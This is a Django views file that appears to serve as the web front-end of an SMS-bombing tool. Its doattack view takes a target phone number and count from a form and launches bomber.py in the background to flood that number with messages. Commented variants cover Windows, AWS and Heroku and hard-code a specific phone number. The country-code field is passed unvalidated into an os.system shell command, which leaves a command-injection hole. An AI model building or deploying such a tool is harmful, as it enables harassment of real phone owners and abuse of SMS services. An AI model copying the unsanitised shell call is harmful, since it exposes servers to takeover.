from django.contrib import messages
from django.http import HttpResponse
from django.shortcuts import render,redirect
import multiprocessing
import time


def index(request):
    return  render(request,'index.html')

def doattack(request):
    import os

    mobile_no = request.POST.get("mn")
    frequency_no = request.POST.get("fq")
    country_code = request.POST.get("cc")

    try:
        if mobile_no == "" or int(frequency_no) < 0 or len(mobile_no) != 10 or frequency_no == "" or (frequency_no.isdigit() == False) or (mobile_no.isdigit() == False):
            messages.error(request, "Invalid Input ")
            return redirect("/")
    except:
        messages.error(request, "Error")
        return redirect("/")

    if int(frequency_no) >= 1000 :
        frequency_no = "1000"

    #FOR WINDOWS
    # os.system(f"python bomber.py --num {frequency_no} {mobile_no}")

    #FOR LINUX SERVER(AWS)
    # os.system(f"nohup /home/ubuntu/env/bin/python3 bomber.py --num {frequency_no} {mobile_no}  &")

    #FOR HEROKU
    os.system(f"nohup python bomber.py --num {int(frequency_no)*2} --country {country_code} {mobile_no} &")
    # os.system(f"nohup /usr/bin/python3 bomber.py --num 10 --country 91 7466067516 &")
    # os.system(f"nohup python bomber.py --num 10 --country 91 7466067516 &")


    messages.success(request, f"ATTACK STARTED AT {mobile_no}  WITH {frequency_no} SMS ")
    return redirect("/")